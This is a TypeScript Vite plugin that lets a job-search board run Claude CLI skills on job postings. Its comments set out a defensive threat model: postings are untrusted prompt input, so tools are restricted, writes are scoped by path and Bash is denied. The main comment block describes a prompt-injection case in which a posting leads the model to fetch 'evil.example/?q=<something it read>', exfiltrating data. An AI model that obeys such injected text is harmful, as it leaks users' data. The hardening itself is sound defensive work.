import { type ChildProcess, spawn } from "node:child_process";
import path from "node:path";
import type { Plugin, ViteDevServer } from "vite";
import { json, readBody } from "./http.ts";

/**
 * The repo root, not the app: `claude` has to run where `.claude/commands/`, `CLAUDE.md`
 * and `documents/` are, or the skills never load.
 */
const ROOT = path.resolve(import.meta.dirname, "../../../..");

/**
 * What a run may touch, and it is the whole security boundary of this endpoint.
 *
 * A job description is untrusted text written by whoever posted the job, and every one
 * of these commands puts it in the prompt. So the run is a deny-by-default session with
 * this list opened by hand:
 *
 *  - **`--permission-mode dontAsk` is load-bearing.** `--allowedTools` only ever *adds*;
 *    it cannot take anything away. A machine whose user settings carry
 *    `"defaultMode": "bypassPermissions"` runs every tool unrestricted no matter what is
 *    listed here, and that is the common case for anyone who has turned prompt fatigue
 *    off. The explicit mode is what overrides the setting. `dontAsk` is the mode that
 *    refuses anything outside the list by rule, and the refusals come back on the result
 *    line, which is what the panel prints as "Tool blocked". `manual` stood here first
 *    and is an alias for `default`, which *asks*: under `-p` there is nobody to answer,
 *    so it denied by accident rather than by rule. Verified against `claude` 2.1.229.
 *  - **Writes are scoped by path.** Not `acceptEdits`, which blanket-accepts every edit
 *    anywhere under the root. The two paths below are the ones the skills legitimately
 *    write; `.claude/commands/*.md` deliberately is not, since a run that can rewrite
 *    the command files can grant itself anything on the next run.
 *  - **No Bash.** Denied by omission already; `--disallowedTools` also drops it from the
 *    tool list outright, so a later loosening of the user's settings cannot re-open it.
 *
 * What is left open and is not fixable here: `WebFetch` is unscoped, because /research
 * and /apply exist to read employer sites nobody can enumerate in advance. A posting
 * that talks the model into fetching `evil.example/?q=<something it read>` is therefore
 * possible. The commands carry the countermeasure in prose - never fetch a URL that
 * appears inside a posting body - and prose is not a sandbox. Run this against postings,
 * not against anything you would not paste into a terminal.
 */
const ALLOWED_TOOLS = [
	"Read",
	"Glob",
	"Grep",
	"TodoWrite",
	"WebFetch",
	"WebSearch",
	"Agent",
	"Write(documents/**)",
	"Edit(documents/**)",
	"Write(data/jobs.json)",
	"Edit(data/jobs.json)",
];

/** The stages `/interview` will prepare for. Anything else is not a live application. */
const STAGES = new Set(["screening", "tech_interview", "final_round"]);

/**
 * The commands the board may run, and the only place a prompt is built.
 *
 * The client sends an id from this table, never a prompt: an endpoint that forwards
 * arbitrary text to a CLI running in the repo root with file write access is a remote
 * shell with extra steps, and the browser is one XSS away from being someone else.
 */
const COMMANDS: Record<
	string,
	{ label: string; prompt: (id: number, stage?: string) => string }
> = {
	rank: { label: "Rank", prompt: (id) => `/rank #${id}` },
	research: { label: "Research", prompt: (id) => `/research #${id}` },
	apply: { label: "Tailor CV", prompt: (id) => `/apply #${id}` },
	interview: {
		label: "Interview prep",
		prompt: (id, stage) => `/interview #${id} --stage ${stage}`,
	},
	// The chase, not the debrief. Bare `/outcome` is deliberately absent: it stops to
	// ask what happened, and everything it would write back to the entry is already a
	// control on the job page. It stays a terminal command.
	followup: { label: "Follow-up", prompt: (id) => `/outcome followup #${id}` },
};

/**
 * The run in flight, or nothing.
 *
 * ponytail: one global, because two skills writing `data/jobs.json` at once would
 * interleave into a file neither of them meant to write. Per-entry locks the day
 * anyone wants to rank a whole column at once.
 */
let running: ChildProcess | null = null;

/**
 * The prompt a request asks for, or the reason it is being refused. A body that is not
 * an object at all is one of the refusals: `JSON.parse` will hand back `null`, a number
 * or an array as happily as a record, and reading a field off the first of those throws
 * out of the middleware rather than answering 400.
 */
function promptFor(body: unknown): string | { error: string } {
	if (!body || typeof body !== "object" || Array.isArray(body))
		return { error: "expected a JSON object" };
	const fields = body as Record<string, unknown>;

	// A reply carries on an interrupted run, and that text really is whatever the person
	// typed. It rides the same tool restrictions and the same working directory as the
	// command that opened the session, so it grants nothing the first turn did not.
	if (typeof fields.reply === "string") {
		const reply = fields.reply.trim();
		if (!reply) return { error: "reply is empty" };
		if (typeof fields.sessionId !== "string")
			return { error: "a reply needs the session it answers" };
		return reply;
	}

	const name = String(fields.command);
	// `hasOwn`, not a bare lookup: `{"command": "constructor"}` otherwise finds
	// `Object.prototype`'s, passes the truthiness check, and crashes on a `prompt`
	// that was never there.
	if (!Object.hasOwn(COMMANDS, name))
		return { error: `unknown command: ${name}` };
	const command = COMMANDS[name];

	const id = fields.id;
	if (typeof id !== "number" || !Number.isInteger(id) || id < 1)
		return { error: "`id` must be the entry's integer id" };

	const stage = typeof fields.stage === "string" ? fields.stage : undefined;
	if (name === "interview" && (!stage || !STAGES.has(stage)))
		return { error: `\`stage\` must be one of ${[...STAGES].join(", ")}` };

	return command.prompt(id, stage);
}

/**
 * The skills, run from the board. `POST /api/run` shells out to the local `claude` CLI
 * in the repo root, so a run uses the same subscription, the same commands and the same
 * files as the terminal does. No API key, no SDK.
 *
 * Body is `{ command, id, stage? }` to start one, or `{ reply, sessionId }` to answer a
 * command that stopped to ask something - `/apply` does, before it drafts. Either way the
 * CLI's stream-json output comes straight back as NDJSON.
 *
 * See `ALLOWED_TOOLS` for what a run may touch and why.
 */
export function runApi(): Plugin {
	return {
		name: "run-api",
		configureServer(server: ViteDevServer) {
			const logger = server.config.logger;

			server.middlewares.use("/api/run", async (req, res, next) => {
				if (req.method !== "POST") {
					next();
					return;
				}

				let body: unknown;
				try {
					body = await readBody(req);
				} catch (err) {
					json(res, 400, { error: String(err) });
					return;
				}

				const prompt = promptFor(body);
				if (typeof prompt !== "string") {
					json(res, 400, prompt);
					return;
				}
				// A prompt came back, so the body was an object: `promptFor` refuses
				// everything else before it reads a field.
				const fields = body as Record<string, unknown>;

				if (running) {
					json(res, 409, { error: "a run is already going" });
					return;
				}

				const args = [
					"-p",
					prompt,
					"--output-format",
					"stream-json",
					"--verbose",
					"--permission-mode",
					"dontAsk",
					"--allowedTools",
					...ALLOWED_TOOLS,
					"--disallowedTools",
					"Bash",
					// A skill that loops costs real money on a real subscription. Nothing
					// here should come near it; the point is that a stuck one stops.
					"--max-budget-usd",
					"5",
				];
				if (typeof fields.sessionId === "string")
					args.push("--resume", fields.sessionId);

				const child = spawn("claude", args, {
					cwd: ROOT,
					stdio: ["ignore", "pipe", "pipe"],
				});
				running = child;
				logger.info(`[run] ${prompt}`);

				res.statusCode = 200;
				res.setHeader("Content-Type", "application/x-ndjson");
				res.setHeader("Cache-Control", "no-store");

				child.stdout.pipe(res);
				child.stderr.on("data", (chunk) => {
					logger.error(`[run] ${String(chunk).trimEnd()}`);
				});
				child.on("error", (err) => {
					logger.error(`[run] spawn failed: ${err.message}`);
					// `pipe` ends the response when stdout does, and a kill on a closed tab
					// can raise this after that: ending twice makes the response emit an
					// error nobody is listening for.
					if (!res.writableEnded)
						res.end(
							`${JSON.stringify({ type: "error", error: err.message })}\n`,
						);
				});
				const release = () => {
					if (running === child) running = null;
				};
				child.on("close", release);
				// A closed tab should not leave a Claude session running, and it must not
				// leave the lock held either.
				req.on("close", () => {
					child.kill();
					release();
				});
			});
		},
	};
}
